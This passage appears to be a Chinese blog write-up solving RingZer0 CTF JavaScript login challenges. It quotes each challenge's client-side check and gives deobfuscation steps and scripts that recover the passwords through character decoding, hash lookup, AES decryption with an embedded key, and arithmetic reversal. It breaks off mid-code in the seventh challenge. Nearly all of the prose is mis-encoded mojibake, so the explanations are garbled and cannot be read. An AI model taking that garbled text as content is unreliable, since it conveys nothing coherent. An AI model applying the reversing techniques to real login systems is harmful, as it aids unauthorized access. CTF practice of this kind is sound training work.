        <content type="html"><![CDATA[<p>åœ¨ç½‘ä¸Šæ— æ„é—´çœ‹è§ä¸€ä¸ªCTF è§£é¢˜å¹³å°ï¼Œæ„Ÿè§‰é‡Œé¢çš„åˆ†ç±»è¿˜æŒºæœ‰æ„æ€çš„ã€‚äºæ˜¯æŒ‘äº†ä¸€ä¸ªjavascript challengeæ¥åšä¸€ä¸‹ã€‚æœ€è¿‘åšé¢˜æ—¶ç»å¸¸æ„Ÿæ…¨jsçš„å¾ˆå¤šå¼±ç±»å‹ç‰¹æ€§è¿œæ¯”phpä¸°å¯Œçš„å¤šäº†ï¼Œæ‰€ä»¥å€Ÿæ­¤æœºä¼šç®€å•æ¥è§¦ä¸‹jsçš„é­”é¬¼ä»£ç </p><a id="more"></a><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>é¦–å…ˆjsç±»å‹çš„é¢˜ç›®å¿…ç„¶æ˜¯åœ¨é™æ€é¡µé¢å°±å¯ä»¥æ‰¾åˆ°æºç çš„ã€‚æœ‰æ—¶ä¼šåŠ æ··æ·†ï¼Œä½†æ··æ·†çš„æœºç†å…¶å®åŸºæœ¬ä¸Šéƒ½æŒºä¸€èˆ¬çš„ã€‚è¿™é‡Œç›´æ¥æŸ¥çœ‹é¡µé¢æºç </p><pre><code class="javascript">// Look&#39;s like weak JavaScript auth script :)$(&quot;.c_submit&quot;).click(function(event) {    event.preventDefault()    var u = $(&quot;#cuser&quot;).val();    var p = $(&quot;#cpass&quot;).val();    if(u == &quot;admin&quot; &amp;&amp; p == String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)) {        if(document.location.href.indexOf(&quot;?p=&quot;) == -1) {               document.location = document.location.href + &quot;?p=&quot; + p;        }    } else {        $(&quot;#cresponse&quot;).html(&quot;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&quot;);    }});</code></pre><p>å‘ç°ä¸€ä¸ªç”¨æˆ·å¯†ç çš„åˆ¤æ–­ã€‚æˆåŠŸç™»é™†å³å¯å®Œæˆäº‹ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬æŠŠå¯†ç æ‰”è¿›consoleè½¬æ¢å¾—åˆ°<code>JavaScriptIsSecure</code>.ç™»é™†æ‹¿flag.</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><pre><code class="javascript">// Look&#39;s like weak JavaScript auth script :)                                                                          $(&quot;.c_submit&quot;).click(function(event) {    event.preventDefault();    var p = $(&quot;#cpass&quot;).val();    if(Sha1.hash(p) == &quot;b89356ff6151527e89c4f3e3d30c8e6586c63962&quot;) {        if(document.location.href.indexOf(&quot;?p=&quot;) == -1) {               document.location = document.location.href + &quot;?p=&quot; + p;        }    } else {        $(&quot;#cresponse&quot;).html(&quot;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&quot;);    }});</code></pre><p>è¿™é‡Œç›´æ¥ç”¨æ˜ç¡®çš„ç®—æ³•å¯¹å¯†ç è¿›è¡ŒåŠ å¯†ç„¶åä¸hashå€¼è¿›è¡Œæ¯”è¾ƒã€‚ä¸è¿‡æ³¨æ„çš„æ˜¯phpé‡Œå¸¸è§çš„0ä¸0eçš„å¼±ç±»å‹æ¯”è¾ƒåœ¨jsä¸­æ˜¯ä¸ä¼šå‡ºç°çš„ï¼ˆä½†æ˜¯å¯èƒ½ä¼šå‡ºç°å…¶ä»–å¼±ç±»å‹é—®é¢˜ï¼‰</p><p>æ‰€ä»¥ç›´æ¥å»ç½‘ä¸Šæ‰¾å¾—åˆ°<code>adminz</code>å¼±å¯†ç ã€‚</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>ä¸€ä¸ªå…¸å‹çš„æ··æ·†ã€‚åŒæ ·ä¹Ÿæ˜¯å…¸å‹çš„è§£æ³•ã€‚</p><pre><code class="javascript">var _0xc360=[&quot;\x76\x61\x6C&quot;,&quot;\x23\x63\x70\x61\x73\x73&quot;,&quot;\x61\x6C\x6B\x33&quot;,&quot;\x30\x32\x6C\x31&quot;,&quot;\x3F\x70\x3D&quot;,&quot;\x69\x6E\x64\x65\x78\x4F\x66&quot;,&quot;\x68\x72\x65\x66&quot;,&quot;\x6C\x6F\x63\x61\x74\x69\x6F\x6E&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E&quot;,&quot;\x68\x74\x6D\x6C&quot;,&quot;\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65&quot;,&quot;\x63\x6C\x69\x63\x6B&quot;,&quot;\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74&quot;];$(_0xc360[12])[_0xc360[11]](function (){var _0xf382x1=$(_0xc360[1])[_0xc360[0]]();var _0xf382x2=_0xc360[2];if(_0xf382x1==_0xc360[3]+_0xf382x2){if(document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4])==-1){document[_0xc360[7]]=document[_0xc360[7]][_0xc360[6]]+_0xc360[4]+_0xf382x1;} ;} else {$(_0xc360[10])[_0xc360[9]](_0xc360[8]);} ;} );</code></pre><p>æˆ‘ä¸ªäººä¹ æƒ¯æ˜¯ç”¨è¿™ä¸ª<a href="https://lelinhtinh.github.io/de4js/" target="_blank" rel="noopener">ç½‘ç«™</a>å…ˆå»ä¸€å±‚æ··æ·†ã€‚ç„¶åå†æ¥çœ‹æºç </p><pre><code class="javascript">var _0xc360 = [&quot;val&quot;, &quot;#cpass&quot;, &quot;alk3&quot;, &quot;02l1&quot;, &quot;?p=&quot;, &quot;indexOf&quot;, &quot;href&quot;, &quot;location&quot;, &quot;&lt;div class=\&#39;error\&#39;&gt;Wrong password sorry.&lt;/div&gt;&quot;, &quot;html&quot;, &quot;#cresponse&quot;, &quot;click&quot;, &quot;.c_submit&quot;];$(_0xc360[12])[_0xc360[11]](function () {    var _0xf382x1 = $(_0xc360[1])[_0xc360[0]]();    var _0xf382x2 = _0xc360[2];    if (_0xf382x1 == _0xc360[3] + _0xf382x2) {        if (document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4]) == -1) {            document[_0xc360[7]] = document[_0xc360[7]][_0xc360[6]] + _0xc360[4] + _0xf382x1;        };    } else {        $(_0xc360[10])[_0xc360[9]](_0xc360[8]);    };});</code></pre><p>å…¶å®è¿˜å¯ä»¥è¿›ä¸€æ­¥å»æ··æ·†ã€‚ä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°å¤ªå¥½çš„ç½‘ç«™ã€‚æ‰€ä»¥é€‰æ‹©ç›´æ¥çœ‹ã€‚ä¸éš¾å‘ç°ifè¯­å¥åŠå‰é¢ä¸€è¡Œçš„å†…å®¹æ˜¯<code>var _0xf382x2 = &#39;alk3&#39;; if(_0xf382x1 == &#39;02l1&#39; + _0xf382x2  )</code> å¾ˆæ¸…æ™°çš„è¡¨æ˜äº†éªŒè¯æ–¹å¼åŠå¯†ç <code>02l1alk3</code></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><pre><code class="javascript">$(&quot;.c_submit&quot;).click(function(event) {    event.preventDefault();    var k = CryptoJS.SHA256(&quot;\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37&quot;);    var u = $(&quot;#cuser&quot;).val();    var p = $(&quot;#cpass&quot;).val();    var t = true;    if(u == &quot;\x68\x34\x78\x30\x72&quot;) {        if(!CryptoJS.AES.encrypt(p, CryptoJS.enc.Hex.parse(k.toString().substring(0,32)), { iv: CryptoJS.enc.Hex.parse(k.toString().substring(32,64)) }) == &quot;ob1xQz5ms9hRkPTx+ZHbVg==&quot;) {            t = false;        }        } else {            $(&quot;#cresponse&quot;).html(&quot;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&quot;);            t = false;        }    if(t) {        if(document.location.href.indexOf(&quot;?p=&quot;) == -1) {            document.location = document.location.href + &quot;?p=&quot; + p;        }    }});</code></pre><p>è¿™é‡Œå°±å¼€å§‹ä½¿ç”¨äº†ç®—æ³•è¿›è¡Œå¤„ç†äº†ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°ã€‚useråªåšäº†ä¸€ä¸ª16è¿›åˆ¶çš„ç®€å•æ˜¾ç¤ºé¿å…ç›´è§‚ã€‚è€Œpassåœ¨ivå·²çŸ¥çš„æƒ…å†µä¸‹è¿›è¡Œaesç®—æ³•çš„å¯†æ–‡æ¯”è¾ƒã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è§£å‡ºpass.</p><p>å†™ä¸ªnodeè„šæœ¬è½¬æ¢ä¸‹å¯†ç </p><pre><code class="javascript">const cryptojs = require(&quot;crypto-js&quot;);let k = cryptojs.SHA256(&quot;\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37&quot;);let key = cryptojs.enc.Hex.parse(k.toString().substring(0,32));let iv = cryptojs.enc.Hex.parse(k.toString().substring(32,64));let encrypted = &quot;ob1xQz5ms9hRkPTx+ZHbVg==&quot;;let p =cryptojs.AES.decrypt(encrypted,key,{iv:iv});(function hex_to_ascii(str1) {      var hex  = str1.toString();      var str = &#39;&#39;;      for (var n = 0; n &lt; hex.length; n += 2) {          str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));      }      console.log(str); } )(p);</code></pre><p>è¿è¡Œå¾—åˆ°<br><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åŠ ä¸Šç”¨æˆ·åæ‰”è¿›consoleå…¶å®å°±æ˜¯h4x0rã€‚æ‰€ä»¥å³å¯ç™»å½•æ‹¿flag.</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><pre><code class="javascript">function curry( orig_func ) {    var ap = Array.prototype, args = arguments;    function fn() {        ap.push.apply( fn.args, arguments );         return fn.args.length &lt; orig_func.length ? fn : orig_func.apply( this, fn.args );    }    return function() {        fn.args = ap.slice.call( args, 1 );        return fn.apply( this, arguments );    };}function callback(x,y,i,a) {    return !y.call(x, a[a[&quot;length&quot;]-1-i].toString().slice(19,21)) ? x : {};}var ref = {T : &quot;BG8&quot;,J : &quot;jep&quot;,j : &quot;M2L&quot;,K : &quot;L23&quot;,H : &quot;r1A&quot;};function validatekey(){    e = false;    var _strKey = &quot;&quot;;    try {        _strKey = document.getElementById(&quot;key&quot;).value;        var a = _strKey.split(&quot;-&quot;);        if(a.length !== 5)            e = true;        var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));        if(!equal(o,ref))            e = true;    }catch(e){        e = true;    }    if(!e) {        if(document.location.href.indexOf(&quot;?p=&quot;) == -1) {            document.location = document.location.href + &quot;?p=&quot; + _strKey;        }    } else {        $(&quot;#cresponse&quot;).html(&quot;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&quot;);    }   }function equal(o,o1){    var keys1 = Object.keys(o1);    var keys = Object.keys(o);    if(keys1.length != keys.length)        return false;    for(var i=0;i&lt;keys.length;i++)        if(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]])            return false;    return true;}function hook(f1,f2,f3) {    return function(x) { return f2(f1(x),f3(x));};}var h = curry(hook);var fn = h(function(x) {return x &gt;= 48;},new Function(&quot;a&quot;,&quot;b&quot;,&quot;return a &amp;&amp; b;&quot;));function genFunc(_part) {    if(!_part || !(_part.length) || _part.length !== 4)        return function() {};    return new Function(_part.substring(1,3), &quot;this.&quot; + _part[3] + &quot;=&quot; + _part.slice(1,3) + &quot;+&quot; + (fn(function(y){return y&lt;=57})(_part.charCodeAt(0)) ?  _part[0] : &quot;&#39;&quot;+ _part[0] + &quot;&#39;&quot;));}</code></pre><p>è¿™é¢˜å¼€å§‹éš¾åº¦å°±ä¸Šå‡äº†ã€‚æˆ‘ä»¬å…ˆæ…¢æ…¢å®¡è®¡ä»£ç ã€‚</p><pre><code class="javascript">function validatekey(){    e = false;    var _strKey = &quot;&quot;;    try {        _strKey = document.getElementById(&quot;key&quot;).value;        var a = _strKey.split(&quot;-&quot;);        if(a.length !== 5)            e = true;        var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));        if(!equal(o,ref))            e = true;    }catch(e){        e = true;    }    if(!e) {        if(document.location.href.indexOf(&quot;?p=&quot;) == -1) {            document.location = document.location.href + &quot;?p=&quot; + _strKey;        }    } else {        $(&quot;#cresponse&quot;).html(&quot;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&quot;);    }   }</code></pre><p>è¿™é‡Œå–äº†é¡µé¢ä¸­keyå€¼ï¼ˆå³è¾“å…¥ï¼‰è¿›è¡Œä¸€ç³»åˆ—åˆ¤æ–­ã€‚åªæœ‰eä¸ºfalseæ—¶æˆ‘ä»¬æ‰èƒ½è¿›å…¥<code>document.location = document.location.href + &quot;?p=&quot; + _strKey;</code> æ³¨æ„åˆ°å…¶ä¸­ä¸»è¦è¦æ±‚æ˜¯<code>var a = _strKey.split(&quot;-&quot;);        if(a.length !== 5)......</code> æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ ¼å¼ä¸º<code>xxx-xxx-xxx-xxx-xxx</code>çš„key.</p><p>æ¥ä¸‹æ¥çœ‹å…¶ä»–å‡½æ•°ã€‚è¿™é‡Œçš„<code>curry()</code>æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„jsæŸ¯é‡ŒåŒ–çš„å‡½æ•°( ä¸ºä»€ä¹ˆä¸æ˜¯åº“é‡Œ233) ã€‚å¸¸ç”¨äºå¤šå‚å‡½æ•°å¤ç”¨å¹¶ä¸”ä¸callbackç›¸ç»“åˆã€‚ä¸è¿‡æˆ‘ä»¬ä¸å¿…æ·±ç©¶,å…ˆæ¥çœ‹é€»è¾‘ã€‚</p><pre><code class="javascript">var h = curry(hook);var fn = h(function(x) {return x &gt;= 48;},new Function(&quot;a&quot;,&quot;b&quot;,&quot;return a &amp;&amp; b;&quot;));</code></pre><p>é¦–å…ˆæ˜¯è¿™é‡Œã€‚å‡ºç°äº†ä¸€ä¸ª<code>x&gt;=48</code>ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“xå‚æ•°ä»å“ªé‡Œæ¥ã€‚æ‰€ä»¥ç»§ç»­å‘ä¸‹çœ‹</p><pre><code class="javascript">    return new Function(_part.substring(1,3), &quot;this.&quot; + _part[3] + &quot;=&quot; + _part.slice(1,3) + &quot;+&quot; + (fn(function(y){return y&lt;=57})(_part.charCodeAt(0)) ?  _part[0] : &quot;&#39;&quot;+ _part[0] + &quot;&#39;&quot;));</code></pre><p><code>(fn(function(y){return y&lt;=57})(_part.charCodeAt(0)) ?  _part[0] : &quot;&#39;&quot;+ _part[0] + &quot;&#39;&quot;)</code>è¿™ä¸€éƒ¨åˆ†è¯´æ˜å…¶è¿”å›çš„æ˜¯å‡½æ•°è¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚çœ‹åˆ°è¿™ä¸ªIIFEçš„è°ƒç”¨ä»¥åŠå‰é¢æˆ‘ä»¬fnå‡½æ•°çš„æ„é€ ã€‚å¯ä»¥å¾—å‡ºï¼Œè¿™é‡Œå¯¹æˆ‘ä»¬è¾“å…¥çš„ç¬¬1ä¸ªå­—ç¬¦è¿›è¡Œäº†æ¯”è¾ƒï¼Œå…¶asciiå€¼åº”è¯¥åœ¨48åˆ°57ä¹‹é—´ï¼ˆå³æ•°å­—ï¼‰å°±ç›´æ¥å–æ•°å­—ï¼Œå¦åˆ™å°±åŠ ä¸Š<code>&#39;&#39;</code> ç®€å•çš„è°ƒç”¨ä¸‹æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºæ¥<br><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€Œè¿™ä¸ªæ•´ä½“æ˜¯ä¸<code>_part.substring(1,3)</code>ä½œä¸ºå‚æ•°è¢«é€è¿›æ„é€ å‡½æ•°çš„ã€‚å‘ç°ä»–æ˜¯åœ¨keyçš„æ£€æŸ¥é‡Œè¢«è°ƒç”¨äº†<code>var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));</code><br>æˆ‘ä»¬å›å¤´çœ‹ä¸‹callbackå‡½æ•°çš„å®šä¹‰ä»¥åŠreduceRightå‡½æ•°çš„åŠŸèƒ½</p><pre><code class="javascript">function callback(x,y,i,a) {    return !y.call(x, a[a[&quot;length&quot;]-1-i].toString().slice(19,21)) ? x : {};}reduceRight() æ–¹æ³•æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºç´¯åŠ å™¨ï¼ˆaccumulatorï¼‰å’Œæ•°ç»„çš„æ¯ä¸ªå€¼ï¼ˆä»å³åˆ°å·¦ï¼‰å°†å…¶å‡å°‘ä¸ºå•ä¸ªå€¼ã€‚</code></pre><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRight" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRight</a><br>å‚è€ƒä¸Šé¢çš„æ–‡æ¡£æˆ‘ä»¬çŸ¥é“ï¼Œcallbackä½œä¸ºå›è°ƒå‡½æ•°ï¼Œç”¨äºæ“ä½œæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œè€Œæˆ‘ä»¬ä¼ å…¥çš„a[4]ç”Ÿæˆçš„å‡½æ•°æ˜¯æ•°ç»„æœ€å³çš„èµ·ç‚¹ã€‚ä¹‹åä¾æ¬¡å‘å·¦è¿›è¡Œå¤„ç†ã€‚</p><p>è¿™é‡Œæˆ‘å°½é‡ä½œå®Œæ•´çš„è§£é‡Šã€‚é¦–å…ˆcallbackä¸­<code>a[&quot;length&quot;]-1-i</code>å¯¹åº”çš„æ˜¯<code>a.length-1-i</code>å³<code>5-1-i</code>=<code>4-i</code>.ç„¶åcallbackå‡½æ•°çš„å››ä¸ªå‚æ•°åˆ†åˆ«å¯¹åº”äº†ç©ºmapï¼Œæ„é€ å‡½æ•°ï¼Œå åŠ å™¨çš„è¶Ÿæ•°ï¼Œä»¥åŠè¢«å¤„ç†è¿‡çš„è¾“å…¥aï¼ˆä»<code>xxxx-xxxx-xxxx-xxxx-xxxx</code> å˜æˆä¸€ä¸ª5å…ƒç´ çš„æ•°ç»„ï¼‰æˆ‘ä»¬ç®€å•è°ƒç”¨ä¸‹,ä¼šå‘ç°æœ€ç»ˆè¿”å›çš„ç»“æœä¸­æ¯ä¸ªæ•°ç»„å…ƒç´ çš„ç¬¬äºŒï¼Œä¸‰ä¸ªä¼šä¸å˜ï¼Œå¹¶å˜æˆæ–°çš„mapä¸­å¯¹åº”å€¼çš„ç¬¬ä¸€äºŒä½ã€‚ç„¶åå€¼çš„æœ€åä¸€ä½ä¼šå˜æˆåŸæ¥è¾“å…¥æ•°ç»„çš„é€†åºç¬¬ä¸€ä½çš„ç¬¬ä¸€ä¸ªå­—æ¯ã€‚è€Œæ•´ä¸ªè¿”å›çš„mapé”®åæ˜¯åŸè¾“å…¥æ•°ç»„é€†åºçš„æœ€åä¸€ä¸ªå­—æ¯ã€‚</p><p>å¤šè¯´æ— ç›Šã€‚æˆ‘ä»¬ç”¨ä¸€ä¸ªå››å…ƒç´ çš„æ•°ç»„æ¥çœ‹çœ‹è¿”å›ç»“æœ<br><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯ä»¥çœ‹åˆ°ï¼Œè¿”å›çš„mapè¡¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ é”®åæ¥è‡ªåŸæ¥æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ <code>mnop</code>çš„æœ€åä¸€ä¸ªå­—æ¯ã€‚å€¼éƒ¨åˆ†<code>bc</code>ä¿æŒä¸å˜ï¼Œæœ€åä¸€ä¸ªå­—æ¯åˆ™æ˜¯<code>mnop</code>çš„ç¬¬ä¸€ä¸ªå­—æ¯<code>m</code>.</p><p>æ—¢ç„¶æˆ‘ä»¬éœ€è¦æ»¡è¶³è¾“å…¥keyå¤„ç†åä¸º<code>{T : &quot;BG8&quot;,J : &quot;jep&quot;,j : &quot;M2L&quot;,K : &quot;L23&quot;,H : &quot;r1A&quot;};</code> å†™ä¸ªè„šæœ¬å¤„ç†ä¸‹å³å¯</p><pre><code class="javascript">var src = &#39;abcd-efgh-ijkl-mnop-qrst&#39;;var dst = &#39;tbcq-pfgm-ljki-hnoe-drsa&#39;;var key = &#39;TBG8-Jjep-jM2L-KL23-Hr1A&#39;;var input = key;for (i=0; i&lt;src.length; i++) {    p = dst.indexOf(src[i]);    tmp = input.split(&#39;&#39;);    tmp[p] = key[i];    input = tmp.join(&#39;&#39;);}console.log(input);</code></pre><p>å¾—åˆ°key<code>ABGH-3jeK-LM2j-pL2J-8r1T</code></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><pre><code class="javascript">// Look&#39;s like weak JavaScript auth script :)$(&quot;.c_submit&quot;).click(function(event) {    event.preventDefault();    var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283);    var u = $(&quot;#cuser&quot;).val();    var p = $(&quot;#cpass&quot;).val();    var t = true;    if(u == &quot;administrator&quot;) {        for(i = 0; i &lt; u.length; i++) {            if((u.charCodeAt(i) + p.charCodeAt(i) + i * 10) != k[i]) {                $(&quot;#cresponse&quot;).html(&quot;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&quot;);                t = false;                break;            }        }    } else {        $(&quot;#cresponse&quot;).html(&quot;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&quot;);        t = false;    }    if(t) {        if(document.location.href.indexOf(&quot;?p=&quot;) == -1) {            document.location = document.location.href + &quot;?p=&quot; + p;            }    }});</code></pre><p>ç›¸æ¯”ä¸Šä¸€é¢˜ç®—æ˜¯å°èœäº†ã€‚ç”¨æˆ·è¾“å…¥å¯†ç çš„asciiä¼šä¸ç”¨æˆ·åadministratorè¿›è¡ŒåŠ æ³•è¿ç®—å¹¶ä¸å·²çŸ¥æ•°ç»„å€¼è¿›è¡Œæ¯”è¾ƒã€‚é‚£ä¹ˆé€†å†™å³å¯</p><pre><code class="python">k = [176,214,205,246,264,255,227,237,242,244,265,270,283]u = [97,100,109,105,110,105,115,116,114,97,116,111,114]p = {}s = &quot;administrator&quot;list1=[]for i in range(0, len(s)):    p[i] = k[i] - u[i] - i*10    list1.append(p[i])print(&#39;&#39;.join(chr(i) for i in list1))</code></pre><p>å¾—åˆ°<code>OhLord4309111</code></p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><pre><code class="javascript">// Look&#39;s like weak JavaScript auth script :)$(&quot;.c_submit&quot;).click(function(event) {    event.preventDefault();    var u = $(&quot;#cpass&quot;).val();    var k = $(&quot;#cuser&quot;).val();    var func = &quot;\x2B\x09\x4A\x03\x49\x0F\x0E\x14\x15\x1A\x00\x10\x3F\x1A\x71\x5C\x5B\x5B\x00\x1A\x16\x38\x06\x46\x66\x5A\x55\x30\x0A\x03\x1D\x08\x50\x5F\x51\x15\x6B\x4F\x19\x56\x00\x54\x1B\x50\x58\x21\x1A\x0F\x13\x07\x46\x1D\x58\x58\x21\x0E\x16\x1F\x06\x5C\x1D\x5C\x45\x27\x09\x4C\x1F\x07\x56\x56\x4C\x78\x24\x47\x40\x49\x19\x0F\x11\x1D\x17\x7F\x52\x42\x5B\x58\x1B\x13\x4F\x17\x26\x00\x01\x03\x04\x57\x5D\x40\x19\x2E\x00\x01\x17\x1D\x5B\x5C\x5A\x17\x7F\x4F\x06\x19\x0A\x47\x5E\x51\x59\x36\x41\x0E\x19\x0A\x53\x47\x5D\x58\x2C\x41\x0A\x04\x0C\x54\x13\x1F\x17\x60\x50\x12\x4B\x4B\x12\x18\x14\x42\x79\x4F\x1F\x56\x14\x12\x56\x58\x44\x27\x4F\x19\x56\x49\x16\x1B\x16\x14\x21\x1D\x07\x05\x19\x5D\x5D\x47\x52\x60\x46\x4C\x1E\x1D\x5F\x5F\x1C\x15\x7E\x0B\x0B\x00\x49\x51\x5F\x55\x44\x31\x52\x45\x13\x1B\x40\x5C\x46\x10\x7C\x38\x10\x19\x07\x55\x13\x44\x56\x31\x1C\x15\x19\x1B\x56\x13\x47\x58\x30\x1D\x1B\x58\x55\x1D\x57\x5D\x41\x7C\x4D\x4B\x4D\x49\x4F&quot;;    buf = &quot;&quot;;    if (k.length == 9) {        for (i = 0, j = 0; i &lt; func.length; i++) {            c = parseInt(func.charCodeAt(i));            c = c ^ k.charCodeAt(j);            if (++j == k.length) {                j = 0;            }            buf += eval(&#39;&quot;&#39; + a(x(c)) + &#39;&quot;&#39;);        }        eval(buf);    } else {        $(&quot;#cresponse&quot;).html(&quot;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&quot;);    }});function a(h) {    if (h.length != 2) {        h = &quot;\x30&quot; + h;    }    return &quot;\x5c\x78&quot; + h;}function x(d) {    if (d &lt; 0) {        d = 0xFFFFFFFF + d + 1;    }    return d.toString(16).toUpperCase();}</code></pre><p>è¿™é‡Œä»£ç æµç¨‹ä¹Ÿæ¯”è¾ƒå¤æ‚ã€‚ç®€å•æ¦‚æ‹¬å°±æ˜¯å»usernameä½œä¸ºè¾“å…¥ç„¶åæ¯9ä¸ªå­—ç¬¦ä¸æ‰€ç»™çš„funcè¿›è¡Œå¼‚æˆ–ã€‚æœ€åç»“æœä¼šè½¬hex.</p><p>è™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“éœ€è¦çš„usernameæ˜æ–‡ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨<code>a^b=c =&gt; a^c=b</code>è¿™ç‚¹ï¼ŒçŒœæµ‹å¯†æ–‡ä¸­å¯èƒ½ä¼šå­˜åœ¨è·Ÿå‰é¢çš„å‡ºflagä¸€è‡´çš„</p><pre><code class="javascript">if(document.location.href.indexOf(&quot;?p=&quot;) == -1) {            document.location = document.location.href + &quot;?p=&quot; + p; }</code></pre><p>æ‰€ä»¥æˆ‘ä»¬ç®€å•çˆ†ç ´ä¸‹usernameå¹¶è¿›è¡Œå†…å®¹ç­›é€‰ï¼Œæ‰¾å‡ºæœ‰documentå‡ºç°çš„ç»“æœ<br>è¿™é‡Œå€Ÿç”¨å¦ä¸€ä½å¸ˆå‚…çš„è„šæœ¬<a href="https://github.com/NotSurprised/RingZer0-CTF-Writeup/blob/master/JavaScript/07.%20Why%20not%20be%20more%20secure/Why%20not%20be%20more%20secure.md" target="_blank" rel="noopener">https://github.com/NotSurprised/RingZer0-CTF-Writeup/blob/master/JavaScript/07.%20Why%20not%20be%20more%20secure/Why%20not%20be%20more%20secure.md</a></p><pre><code class="javascript">var func = &quot;\x2B\x09\x4A\x03\x49\x0F\x0E\x14\x15\x1A\x00\x10\x3F\x1A\x71\x5C\x5B\x5B\x00\x1A\x16\x38\x06\x46\x66\x5A\x55\x30\x0A\x03\x1D\x08\x50\x5F\x51\x15\x6B\x4F\x19\x56\x00\x54\x1B\x50\x58\x21\x1A\x0F\x13\x07\x46\x1D\x58\x58\x21\x0E\x16\x1F\x06\x5C\x1D\x5C\x45\x27\x09\x4C\x1F\x07\x56\x56\x4C\x78\x24\x47\x40\x49\x19\x0F\x11\x1D\x17\x7F\x52\x42\x5B\x58\x1B\x13\x4F\x17\x26\x00\x01\x03\x04\x57\x5D\x40\x19\x2E\x00\x01\x17\x1D\x5B\x5C\x5A\x17\x7F\x4F\x06\x19\x0A\x47\x5E\x51\x59\x36\x41\x0E\x19\x0A\x53\x47\x5D\x58\x2C\x41\x0A\x04\x0C\x54\x13\x1F\x17\x60\x50\x12\x4B\x4B\x12\x18\x14\x42\x79\x4F\x1F\x56\x14\x12\x56\x58\x44\x27\x4F\x19\x56\x49\x16\x1B\